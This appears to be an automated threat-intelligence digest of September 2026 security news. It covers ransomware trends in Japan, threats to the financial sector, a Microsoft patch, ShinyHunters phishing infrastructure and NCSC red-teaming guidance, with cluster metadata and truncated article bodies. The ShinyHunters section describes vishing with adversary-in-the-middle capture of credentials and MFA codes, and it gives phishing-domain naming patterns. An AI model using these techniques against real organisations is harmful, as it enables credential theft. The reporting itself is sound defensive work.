Ransomware incidents in Japan in the first half of 2026: Investigation of The Gentlemen’s infrastructure and evidence of Qilin's AI use By Takahiro Takeda , Jordyn Dunk , Michael Szeliga Thursday, September 17, 2026 06:00 ransomware Threat Spotlight Compared with the same period last year, ransomware incidents in Japan increased slightly by approximately 4.7%, indicating that ransomware continues to pose a significant threat. In Japan, The Gentlemen was the most active ransomware group in the first half of 2026. Attackers continue to primarily target small- and medium-sized enterprises, with organizations capitalized at less than JPY 1 billion accounting for approximately 80% of the total — an increase of around 13% from the previous year. The total number of listings on The Gentlemen’s leak site increased from 48 in January to 105 in July, representing approximately a 2.2-fold increase in activity. Additionally, there is a possibility that Russian-speaking individuals are involved in The Gentlemen’s attacks. Qilin, which recorded the second-highest number of observed incidents in 2026 after The Gentlemen, is leveraging AI to improve the efficiency of its operations. Victimized companies Figure 1 summarizes ransomware incidents affecting Japanese companies from January to July 2026. According to Cisco Talos research, 90 organizations in Japan were affected by ransomware during this period. Compared with 86 incidents during the same period from January to July last year, this represents a slight increase of approximately 4.7%, indicating that ransomware incidents continue to remain at a high level. On a monthly basis, there were approximately 13 incidents per month on average. The number of incidents increased in March and April, with April recording the highest number during the period at 19 incidents. Cases involving overseas offices and subsidiaries accounted for 13.3% of the total. Among these, Taiwan recorded the highest number of incidents, followed by the United States and the Philippines, which recorded the same number of incidents, with multiple cases identified in each country. Figure 1. Ransomware incidents in Japan during the first half of 2026 (January through July). The manufacturing sector continued to be the most affected industry, accounting for 34% of incidents, followed by the information and communications sector at 11% and the services sector at 9% (see Figure 2). Figure 2. Percentage of victim organizations by industry. In terms of the size of the affected organizations, those with capital of less than JPY 100 million accounted for the largest share at 48%, followed by organizations with capital of JPY 100 million to less than JPY 1 billion at 30%. Combined, organizations with capital of less than JPY 1 billion accounted for 78% of the total, representing an increase of around 13% from 69% in 2025. This suggests that attackers are increasingly focusing their efforts on small- and medium-sized enterprises (see Figure 3). Figure 3. Classification of victim organizations by capital size (excluding unknown). Most frequently observed ransomware types in Japan In Japan, the most frequently observed ransomware group in the first half of 2026 was The Gentlemen, with 14 incidents. This was followed by Qilin, which caused the highest number of incidents last year, and SafePay, which had relatively few confirmed incidents during the same period last year, with seven incidents each. The Gentlemen and SafePay have increased their activity this year and can be considered emerging ransomware groups that require increased vigilance. Other ransomware groups observed include NightSpire, NetRunner, LockBit 5.0, RansomEXX, Stormous, and AiLock. Looking at the ransomware groups observed this year, very few of the groups that were active during the same period last year have been observed, highlighting the rapid changes in the ransomware threat landscape. Figure 4. Number of incidents by ransomware type used in attacks (exclude
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Ransomware incidents in Japan in the first half of 2026: Investigation of The Gentlemen’s infrastructure and evidence of Qilin's AI use
  - Published: 2026-09-17T10:00:43+00:00
  - Link: https://blog.talosintelligence.com/ransomware-incidents-in-japan-in-the-first-half-of-2026/
  - Summary: Ransomware incidents in Japan rose 4.7% year over year. The Gentlemen was the most active group, with leak-site listings more than doubling from January to July. Qilin ranked second and appeared to use AI, while SMEs with capital under JPY 1 billion represented 80% of victims.

### Cluster aaf3283e67 — score 12

- Title: Follow the Money: The Financial Sector's Threat Landscape in 2026
- Source: Intel 471 (ransomware_ecrime_financial_crime)
- Published: 2026-09-10T18:45:00+00:00
- Link: https://www.intel471.com/blog/follow-the-money-the-financial-sectors-threat-landscape-in-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, data_breach, phishing_social_eng, ransomware_extortion, supply_chain
- actor_attribution: Cl0p
- affected_industries: financial_services
- affected_products: Microsoft 365, Okta
- content_type: intel_roundup
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, data_breach, apt_espionage
- actor_attribution: Cl0p
- affected_industries: financial_services
- affected_products: Okta, Microsoft 365
- content_type: intel_roundup
- confidence_tier: tier_2_operator

#### Summary

```
The financial sector moves trillions of dollars a day, making it one of the most heavily targeted industries in the world. Intel 471's latest report breaks down the threat landscape facing financial institutions, from ransomware and extortion groups to initial access brokers, nation-state activity and insider risks.
```

#### Full body

```
Follow the Money: The Financial Sector's Threat Landscape in 2026 Sep 10, 2026 An AI voice agent posing as your bank's IT desk. Stolen identities packaged with financial profiles. Document forgery services with mules to complete verification. And a $1.5 billion crypto heist carried out by a nation-state threat group. These are driving today's threats against the financial sector as geopolitical flashpoints turn hacktivist ideology into disruptive campaigns and data extortion groups keep finding cracks in even the most heavily defended networks. Our latest report, Follow the Money: Cyber Threats to the Financial Sector , reveals what that threat activity looks like from inside the underground communities where it's planned, sold, and discussed. This provides security and fraud teams with a deeper look into named threat actors, specific incidents, malware capabilities, and the underground marketplaces actively selling access to financial institutions and services enabling financial fraud. We look at major threats to enterprises in the sector and the separate category of underground services that drive consumer-facing threats such as payment fraud, automated carding attacks, banking trojans, phishing-as-a-service offerings, AI-enabled document forgery and verification bypass, and identity theft. The report contains Intel 471’s monitoring of closed-access forums, data leak sites, marketplaces and Telegram groups and research into the cybercriminal underground backed by insights from the Adversary Intelligence team’s human intelligence (HUMINT) engagements between January 2025 and June 2026. Enterprise Threats The highly regulated financial services sector has invested in advanced, multilayered cybersecurity defenses, but it is not impenetrable. Exposure to key third parties, supply chain compromises, sophisticated credential phishing attacks and the credential and access market provided a way in for data extortion actors. In April 2026, the Everest data extortion-as-a-service (DEaaS) program operator claimed to compromise two U.S.-based banks. Both banks confirmed the breaches originated from a third-party vendor rather than from direct unauthorized access to their own networks. In early 2026, the BlackFile group allegedly carried out multiple voice phishing (vishing) and data extortion campaigns targeting U.S.-based hedge funds and other investment management organizations. The actors impersonated IT support personnel and directed employees to customized phishing pages that imitated Okta or Microsoft 365 authentication portals. These pages were designed to capture credentials, session tokens and MFA codes, enabling the actors to access cloud services and steal sensitive corporate data for extortion. On Jan. 21, 2026, the CLOP ransomware and data extortion group claimed to compromise a U.K.-based payments and commerce services company. In the past, CLOP has exploited vulnerabilities in widely deployed, centralized enterprise products, creating a supply-chain-like concentration effect across downstream customers. Our data revealed extortion groups targeted 340 victims in 74 countries in the financial services sector during the period, with the U.S., U.K., and Canada bearing the brunt of it. The most prevalent groups were Qilin , Akira , and The Gentlemen, and the most impacted within the sector were insurance, investment management and banking and securities. Image: Ransomware and data extortion attacks on the financial services sector between January 2025 and June 2026. Initial access brokers, which specialize in gaining unauthorized access, provide another entry point. These brokers advertised unauthorized access impacting 159 financial services entities over the period. We observed actors offering to sell unauthorized access via compromised virtual private network (VPN) credentials to the networks of about 60 companies and an offer to sell remote desktop protocol (RDP) and shell access for a South Africa-based financial institut
```

#### Corroborating sources (1)

- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: Follow the Money: The Financial Sector's Threat Landscape in 2026
  - Published: 2026-09-10T18:45:00+00:00
  - Link: https://www.intel471.com/blog/follow-the-money-the-financial-sectors-threat-landscape-in-2026
  - Summary: The financial sector moves trillions of dollars a day, making it one of the most heavily targeted industries in the world. Intel 471's latest report breaks down the threat landscape facing financial institutions, from ransomware and extortion groups to initial access brokers, nation-state activity and insider risks.

### Cluster 76bb72a333 — score 12

- Title: Microsoft Releases Emergency Patch to Fix RDS Vulnerability
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-15T08:40:00+00:00
- Link: https://www.infosecurity-magazine.com/news/microsoft-releases-emergency-patch/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion
- affected_industries: government
- affected_products: Anthropic/Claude
- urgency_signals: emergency_patch
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach
- affected_industries: government
- affected_products: Anthropic/Claude
- urgency_signals: emergency_patch
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Microsoft has been forced to issue an out-of-band fix for several issues stemming from this month’s Patch Tuesday
```

#### Full body

```
Infosecurity Magazine Home » News » Microsoft Releases Emergency Patch to Fix RDS Vulnerability Microsoft Releases Emergency Patch to Fix RDS Vulnerability News 15 September 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster IT teams received a boost this week after Microsoft fixed some significant issues with Remote Desktop Services (RDS), Hyper-V and other products. The problems started with this month’s Patch Tuesday, issued on September 8, which included fixes for a record 974 CVEs. Microsoft acknowledged three days later on September 11 that some customers had been having problems with a range of products. “In some environments, RDS might become unstable, resulting in RDP connections failing after several minutes, sign-in issues, or servers hanging at ‘Please wait for the Remote Desktop Configuration’,” it said in a health status update. “Related tools, including Microsoft Management Console (MMC), RDS Licensing Diagnoser, and File Explorer might also become unresponsive. Additionally, the Windows Update page might stop responding and continuously display a loading indicator.” Read more on Microsoft RDS issues: “Wormable” Bug Could Enable Another WannaCry. An update released on September 14 (KB5129195) has fixed these issues, the Redmond giant claimed. “IT administrators who deployed a temporary mitigation through Group Policy do not need to take any action before installing this OOB update,” Microsoft added. “This OOB update is cumulative and includes all improvements and security protections contained in previous Windows updates. As a best practice, we recommend installing the latest update available for your devices, as it contains important improvements and issue resolutions, including this one.” Issues Resolved for Hyper-V Users KB5129195 also fixed issues affecting Hyper-V users running Claude Cowork, Windows Subsystem for Linux (WSL), and other applications, Microsoft claimed. “Affected virtual machines start normally, but folders shared from the Windows host using Plan9 do not appear or cannot be accessed in the guest environment,” it said of the technical problem. “Applications or sandbox environments that depend on these shared folders might display an error indicating that no Plan9 drive shares were mounted.” The same patch resolved an issue with USB Audio Class 1.0 devices which may have been failing to start or producing audio since the Patch Tuesday update. In total, Microsoft has now issued six emergency patches to fix failures stemming from September's Patch Tuesday. Image credit: Nwz / Shutterstock.com You may also like Microsoft Kicks Off 2019 With Medium Patch Load News 9 January 2019 Microsoft Shatters Patch Tuesday Record With 974 CVE Fixes in September 2026 News 9 September 2026 Microsoft Fixes 400 Flaws on August Patch Tuesday News 12 August 2026 Microsoft Fixes 17 Critical Flaws in May Patch Tuesday News 13 May 2026 Microsoft Fixes Two Zero-Days in April Patch Tuesday News 15 April 2026 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Major Cyber Vendors Turn to New UK Testing Program as MITRE Evaluations Face Changes News 16 September 2026 1 Microsoft Releases Emergency Patch to Fix RDS Vulnerability News 15 September 2026 2 Most Fraudulent Hires Receive Credentials Before Detection News 15 September 2026 3 Revolut Confirms Data Breach Through Fake Government Requests News 14 September 2026 4 Most Firms Unable to Recover Quickly from Ransomware News 15 September 2026 5 Cyber-Attacks Cost Organizations $52,000 on Average News 16 September 2026 6 Anthropic Reveals Yet Another Cybersecurity Incident News 10 September 2026 1 Major Cyber Vendors Turn to New UK Testing Program as MITRE Evaluations Face Changes News 16 September 2026 2 FBI Publishes First-Ever Cyber Strategy, With Focus on Disrupting Threat Actors News 10 September 2026 3 Defense Cyber Spending Set to Surge Amid Rising Attacks on Military Systems News 14
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Microsoft Releases Emergency Patch to Fix RDS Vulnerability
  - Published: 2026-09-15T08:40:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/microsoft-releases-emergency-patch/
  - Summary: Microsoft has been forced to issue an out-of-band fix for several issues stemming from this month’s Patch Tuesday

### Cluster d8c893e316 — score 12

- Title: Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-11T13:27:34+00:00
- Link: https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: ShinyHunters

#### Cluster taxonomy (union across members)
- threat_categories: mfa_bypass, phishing_social_eng, ransomware_extortion
- actor_attribution: ShinyHunters, UNC6240, UNC6661
- affected_industries: financial_services
- affected_products: Microsoft 365, Microsoft SharePoint, Salesforce
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, mfa_bypass
- actor_attribution: ShinyHunters, UNC6661, UNC6240
- affected_industries: financial_services
- affected_products: Salesforce, Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration.
```

#### Full body

```
Stephen Campbell 5 min read August 5, 2026 Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Phishing panels are not just credential collection tools. They are infrastructure ecosystems. Behind every convincing login page is a set of domains, hosting providers, certificates, exposed services, operator tooling, and recurring deployment patterns. Those signals matter. They give defenders a way to move beyond a single phishing domain and start understanding how the activity is built, hosted, rotated, and reused. Push Security recently published an inside look at phishing panels used in campaigns linked to ShinyHunters and BlackFile . Their team gained direct access to active operator panels, observed real victim targeting, analyzed multiple variants of the tooling, and identified four primary infrastructure clusters. They also made an important point: while these panels share common heritage, the operators deploying them appear to be separate groups with different infrastructure preferences and operational patterns. That operator-side view is valuable because it shows how the attack works from inside the panel. Team Cymru’s view is different. Using Pure Signal Scout, we looked at the infrastructure layer to validate and expand part of the picture Push identified. Our analysis focused on Cluster A, the Doko’s Panel infrastructure hosted on Mevspace AS201814. Push noted that Cluster A overlaps with Mandiant reporting on UNC6661 , and that Mandiant attributes related extortion activity following UNC6661 intrusions to UNC6240, also known as ShinyHunters. Using passive DNS, certificate data, open service observations, and hosting patterns, we identified two active Mevspace IPs consistent with Push’s Cluster A criteria. Those IPs were associated with more than 40 victim-themed domains, recurring naming conventions, and one Doko-branded hosting-layer artifact that provides additional pivot context. This is not a reattribution of the activity. Push established the panel and cluster framework. Team Cymru’s contribution is infrastructure validation: confirming that infrastructure consistent with Push’s Cluster A reporting was active on Mevspace and surfacing additional indicators defenders can hunt against. Why Cluster A matters Cluster A matters because the targeting pattern is not random. Push described campaigns that combine voice phishing with adversary-in-the-middle credential capture against enterprise identity providers and cryptocurrency platforms. The victim is typically directed to a domain that looks like an internal identity, support, passkey, or SSO page. Once credentials and MFA are captured, the operator can attempt to access identity providers and pivot into connected SaaS environments such as Salesforce, SharePoint, Slack, DocuSign, or other high-value applications. That makes the infrastructure behind these panels important. The domain is the visible piece, but it is rarely the whole picture. Hosting providers, ASN usage, TLS behavior, passive DNS history, certificates, and exposed services can show how the operation is being staged. In this case, Push identified Mevspace AS201814 as the hosting provider for Cluster A. They also documented the Cluster A naming patterns, including: <target>internal.com <target>sso.com my<target>.com my<target>internal.com my<target>manager.com my<target>sso.com Using those patterns as a starting point, Scout surfaced active infrastructure consistent with the same cluster. Confirming Cluster A on Mevspace Push identified Mevspace AS201814 as the Cluster A hosting provider but did not publish IP-level indicators. Starting from the hosting provider and domain naming criteria, a single Scout query returned three results: asn="201814" pdns.domain="*internal.com,*sso.com" Scout query result for Mevspace AS201814 with the Cluster A domain pattern Figure 1: Scout returns three IPs for the Mevspace AS201814 plus *internal.com,*sso.com query. Two of them,
```

#### Corroborating sources (2)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
  - Published: 2026-09-11T13:27:34+00:00
  - Link: https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
  - Summary: Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration.
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Voice Callers Exploit BYOD to Reach Microsoft 365, Corporate Data
  - Published: 2026-09-10T20:36:03+00:00
  - Link: https://www.darkreading.com/threat-intelligence/voice-callers-exploit-byod-microsoft-365-corporate-data
  - Summary: Threat actors are leveraging Microsoft's Graph API to identify lucrative targets, then passing their access to extortion groups like ShinyHunters.

### Cluster 2f0547b4d4 — score 11

- Title: Adversary simulation: what you need to know
- Source: NCSC UK (government_authoritative)
- Published: 2026-09-17T12:00:00+00:00
- Link: https://www.ncsc.gov.uk/guidance/adversary-simulation-what-you-need-to-know
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Adversary simulation ('red teaming') tests your ability to prevent, detect and respond to cyber attacks.
```

#### Full body

```
Guidance Download & print article PDF Download & print article PDF Adversary simulation: what you need to know Adversary simulation ('red teaming') tests your ability to prevent, detect and respond to cyber attacks. ArtemisDiana via Getty Images This guidance is for organisations wanting to understand if adversary simulation (sometimes known as ‘red teaming’) is right for them. It is designed for system owners and security professionals within medium to large-sized organisations. Providers of adversary simulation services may also find this guidance useful, especially those considering joining the NCSC’s assured Cyber Adversary Simulation (CyAS) Scheme , as the methodology within the scheme aligns to this guidance. The scheme assures commercial organisations providing adversary simulation services which meet the NCSC’s rigorous technical standards. In this guidance: What is adversary simulation? What organisations benefit from adversary simulation? How long does an adversary simulation engagement take? Adversary simulation best practice 'Full spectrum' vs 'assumed breach' approaches Phase 1: Prerequisites Phase 2: Testing Phase 3: Reporting Alternative NCSC assurance schemes and resources What is adversary simulation? Adversary simulation is designed to test an organisation’s defences against a realistic cyber attack by systematically testing an organisation's ability to prevent, detect and respond to a range of cyber attack scenarios. Also known as ‘red teaming’, adversary simulation involves replicating the actions an adversary is likely to use in a real attack, and aims to safely achieve one or more specified outcomes that would have a significant impact on business functions if a malicious attacker were to achieve them. It can be conducted by internal teams carrying out their own due diligence, or by external providers specialising in this type of service. Adversary simulation tests whether your organisation’s technical defences are aligned and operate as expected, and reveals where you may have gaps in your security posture. It also evaluates whether your team can identify threats early, triage them quickly and appropriately, and escalate where necessary. Adversary simulation differs from penetration testing as it focuses on the efficacy of an organisation's technical controls and detection, whereas penetration testing is more focused on identifying all technical vulnerabilities within an organisation’s IT systems. Note: The NCSC would expect all responsible adversary simulation teams to ensure that their resources, tools and capabilities have safety features/guardrails to minimise risks to the customer systems and other users. What organisations benefit from adversary simulation? Adversary simulation is best suited to organisations with a mature understanding of the cyber risks they face. To get the most from adversary simulation, these organisations will: have identified, assessed, and be regularly reviewing their risks have well-established mitigations and defences in place have robust network monitoring and detection systems Adversary simulation should verify that your network monitoring and detection teams (whether provided by an internal team or third-party suppliers) can detect unusual activity and respond appropriately. While adversary simulation is appropriate for any organisation meeting the above conditions, it is particularly useful for larger organisations, or for those operating within critical national infrastructure or UK government. Note: Organisations which fall outside these parameters (perhaps operating relatively small and simple networks, or still developing an understanding of risk) may find more value from the services provided by companies assured under other NCSC-assurance schemes . How long does an adversary simulation engagement take? A typical adversary simulation engagement will normally take between 8 and 12 weeks to complete, depending on its size and scope, although a full spectrum engagem
```

#### Corroborating sources (1)

- **NCSC UK** (government_authoritative)
  - Title: Adversary simulation: what you need to know
  - Published: 2026-09-17T12:00:00+00:00
  - Link: https://www.ncsc.gov.uk/guidance/adversary-simulation-what-you-need-to-know
  - Summary: Adversary simulation ('red teaming') tests your ability to prevent, detect and respond to cyber attacks.

### Cluster 1210516def — score 11

- Title: LausivLoader analysis, or how to pass data between malware stages, (Thu, Sep 17th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-09-17T15:06:44+00:00
- Link: https://isc.sans.edu/diary/rss/33348
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
At the end of August, a malspam message was caught in the quarantine of a mail gateway operated by one of my customers. The message was not especially remarkable â;€;“; it asked the recipient to review some attached requirements and provide a price quotation for a fiber optic system and appeared to impersonate an employee of a legitimate company. ; ; The receiving gateway quarantined the message because it detected malicious content in the attachment, though even if it didnâ;€;™t, the e-mail would not have gotten much further due to failed SPF and DMARC checks. ;
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: LausivLoader analysis, or how to pass data between malware stages, (Thu, Sep 17th)
  - Published: 2026-09-17T15:06:44+00:00
  - Link: https://isc.sans.edu/diary/rss/33348
  - Summary: At the end of August, a malspam message was caught in the quarantine of a mail gateway operated by one of my customers. The message was not especially remarkable â;€;“; it asked the recipient to review some attached requirements and provide a price quotation for a fiber optic system and appeared to impersonate an employee of a legitimate company. ; ; The receiving gateway quarantined the message because it detected malicious content in the attachment, though even if it didnâ;€;™t, the e-mail would not have gotten much further due to failed SPF and DMARC checks. ;

### Cluster 3e81320fe3 — score 11

- Title: Our View on What It Takes To Be Named an Industry-Recognized Threat Intelligence Leader
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-17T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/forrester-wave-external-threat-intelligence-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, supply_chain
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
A behind-the-scenes look at how Recorded Future earned its spot as a threat intelligence leader in the latest Forrester Wave.
```

#### Full body

```
Our View on What It Takes To Be Named an Industry-Recognized Threat Intelligence Leader Recorded Future was just named a Leader in The Forrester Wave™: External Threat Intelligence Service Providers, Q3 2026. We’re incredibly proud of this acknowledgment, just as we are of every recognition we’ve received over the years. Behind every one of these industry evaluations is a lot of work that readers never see — including product demonstrations, customer reference calls, briefing presentations, and formal questionnaire submissions — all of it condensed into a single final report. But the most interesting part of any industry recognition is all the details and information that resides in the demos, decks, and responses, so we wanted to share some additional context on the factors that we believe contributed to our ranking this year. Use this blog post as a companion guide when reading your complimentary copy of the Forrester Wave™ report, which you’ll find in the link below. Get the report . Superior support for Priority Intelligence Requirements Priority Intelligence Requirements (PIRs) are foundational in helping security teams achieve meaningful outcomes, because they help shape data collection strategy and support the effective decision-making that enables machine-speed defense. Recorded Future received the highest possible score in the PIR criterion. Forrester’s evaluation describes this score as for vendors that offer “superior support for features such as mechanisms to translate external PIRs meaningfully, advanced querying for building/optimizing PIRs, and structured management of General Intelligence Requirements.” We’ve made PIRs a particular focus in the Recorded Future Platform, adding prebuilt PIRs and enabling customers to use them or define their own in our Impact and Metrics Dashboard . The dashboard surfaces metrics based on those requirements, so teams can more easily measure and better report on how successfully their programs are answering the key questions business leadership wants answered. Extensive intelligence collection sources and deep and dark web monitoring Intelligence is at the core of the modern security stack, and good intelligence is often what separates reactive security teams from proactive ones that can defend themselves pre-attack, at the first sign of threat. To us, Forrester’s evaluation criteria show how important comprehensive intelligence collection is in providing security teams with full visibility across the threat landscape. Here are the different types of data sources we primarily index and analyze and how these data sources can be used for a multitude of use cases: Technical intelligence — network traffic analysis across billions of daily data points from over 200 points of presence, internet-wide scanning and infrastructure monitoring, malware detonation and behavioral analysis, and vulnerability exploitation tracking Underground intelligence — data gathered from criminal forums, marketplaces, and adversaries that can help identify stolen data and credentials, emerging attack techniques, threat actor intent, and ransomware victimology Community intelligence — aggregated detections across customers that reveal patterns and campaign-level activity no single organization would usually catch on its own Open-source intelligence — broader context from data leakage detection, code repository monitoring, social media monitoring, and web/HTML/DOM analysis to help catch brand abuse, impersonation, and exposed data Threat hunting, vulnerability intelligence, third-party risk management, and more We believe that receiving the highest possible scores in the Forrester Wave in criteria around multiple cybersecurity disciplines — including brand protection, third-party and supply chain intelligence, fraud intelligence, and threat hunting and vulnerability intelligence — demonstrate our commitment to providing powerful threat intelligence and defensive capabilities across the entire attack surface.
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Our View on What It Takes To Be Named an Industry-Recognized Threat Intelligence Leader
  - Published: 2026-09-17T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/forrester-wave-external-threat-intelligence-2026
  - Summary: A behind-the-scenes look at how Recorded Future earned its spot as a threat intelligence leader in the latest Forrester Wave.

### Cluster fa1e9027a9 — score 11

- Title: The New Rules of Machine Speed Defense
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-17T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/new-rules-machine-speed-defense
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Experts from Recorded Future and Mastercard explore how security organizations can shift to proactive, machine-speed defense by leveraging high-quality threat intelligence and adhering to evolving global security frameworks designed to help mitigate AI-enabled risks.
```

#### Full body

```
The New Rules of Machine Speed Defense Global security frameworks are evolving: Security organizations are increasingly leveraging global frameworks to navigate the complexities of AI-enabled threats, balancing the need for standardized best practices with the necessity of business-specific risk decisions. Intelligence-led defense is essential: Modern, intelligence-led defense generally requires operationalizing security at machine speed by integrating enriched, contextual threat data, which better enables strategic, risk-based vulnerability prioritization rather than reacting to every threat. Effective security requires data quality and relevance: Organizations must prioritize the quality and "fit for purpose" of the intelligence feeding into their threat intelligence solutions so they can make quick, accurate decisions and avoid the risks of moving fast with bad information. As both human-directed and autonomous AI-powered attacks accelerate, security organizations, policymakers, and industry groups around the world are rethinking traditional approaches to defense. Recorded Future CISO Jason Steer and Mastercard VP of Government Affairs and Policy Christian Ohanian recently sat down with Recorded Future’s Jon Miller to discuss how to build threat intelligence programs that can defend at machine speed, how emerging policy frameworks can help, and why high-quality intelligence is increasingly essential in this new era. This blog offers highlights from the discussion. Watch the full event. Evolving security standards and frameworks Globally, security frameworks like the National Institute of Standards and Technology (NIST) Cyber AI Profile and Singapore’s cybersecurity guidelines are evolving to help organizations keep pace with new threats. According to Christian Ohanian, the goal is to encourage the adoption of AI to bolster resilience while also providing guidance on the kinds of AI-enabled threats organizations now face. However, Ohanian pointed out that creating these standards involves debate. While some argue that frameworks should provide a clear, prioritized checklist to help resource-strapped teams improve their security programs, others believe that a "one-size-fits-all" approach fails to account for the unique risk profiles of different industries and organizations. Jason Steer noted that while standards create a helpful taxonomy, the burden remains on CISOs to translate that language into business-specific risk decisions. “This is why intelligence is important,” he noted. “Every industry, every geography, has its own subtleties of attack, so leaning into ‘What are the real risks to my business?’ becomes the hardest part.” The role of high-quality, purpose-fit intelligence Ohanian noted that global security standards increasingly recognize that threat intelligence is a foundational component of modern defense. They’re also beginning to acknowledge that security organizations need to use AI and other autonomous solutions to improve the way they operationalize their intelligence. Framework discussions, he said, are now focused on “the importance of organizations looking really closely at how they can increase the speed of the way they’re using threat intelligence, how they can increase the accuracy of the prioritization of the alerts and warnings they’re getting.” Ohanian emphasized that organizations must move beyond the simple acquisition of data and evaluate the intelligence sources feeding into their threat intelligence solutions. They need to look at "fit for purpose," ensuring that the intelligence aligns with the organization’s specific risk profile and governance requirements. Steer agreed. “Coverage and collection at fast speed enable information to be brought together for people to assess the impact to their business,” he said. “But then it's only good if that information gets to the right people in the right tools.” When it does, he said, high-quality intelligence can better fulfill its ultimate goal of pro
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: The New Rules of Machine Speed Defense
  - Published: 2026-09-17T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/new-rules-machine-speed-defense
  - Summary: Experts from Recorded Future and Mastercard explore how security organizations can shift to proactive, machine-speed defense by leveraging high-quality threat intelligence and adhering to evolving global security frameworks designed to help mitigate AI-enabled risks.

### Cluster 7110d0c027 — score 11

- Title: We’re In: Enterprise Commitment to Sustainable Package Registries
- Source: OpenSSF Blog (ai_security_agentic_risk)
- Published: 2026-09-16T08:17:17+00:00
- Link: https://openssf.org/blog/2026/09/16/were-in-enterprise-commitment-to-sustainable-package-registries/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: critical_infrastructure, financial_services, government
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: financial_services, government, critical_infrastructure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The OpenSSF Governing Board and major tech enterprises are partnering to support sustainable funding models for public package registries. This commitment aims to secure and scale the global software supply chain while ensuring open source stays free and accessible for individual developers.
```

#### Full body

```
The OpenSSF Governing Board recognizes that the current funding model for public package registries is no longer sustainable. As AI reshapes how software is built and dramatically increases demand on registries, we support sustainable funding models and intend to participate in them as enterprise customers. Public package registries are critical infrastructure for the global software supply chain. Every organization that builds software depends on them, yet these registries face growing demands for security, reliability, compliance, and developer experience. We’re grateful to the people and organizations who have kept this infrastructure running for the benefit of us all. As enterprises that depend on these registries every day, we are ready to be part of the solution. Registry stewards have been sounding the alarm for the past year. Open letters published in 2025 and 2026 described the growing operational and financial pressures facing package registries such as rising infrastructure costs, and the increasing investment required to strengthen security and improve the developer experience. We agree. We Depend on This Infrastructure Our organizations build, ship, and operate software on top of public package registries: PyPI, Maven Central, crates.io, RubyGems, npm, NuGet, OpenVSX, Packagist, and others. These registries serve trillions of downloads annually. They are not optional. They are load-bearing infrastructure for the global software supply chain. Today, most registries survive on infrastructure credits donated by a handful of sponsors and the heroic efforts of small teams, often just two or three people. Download volumes grow 30 to 50% year over year while funding remains flat (mostly driven by the explosion of agentic coding agents). The number of malicious components that require human analysis and takedown has reached 1.8 million packages so far in 2026 and has already exceeded the number we saw in 2025. With the burst of AI-discovered 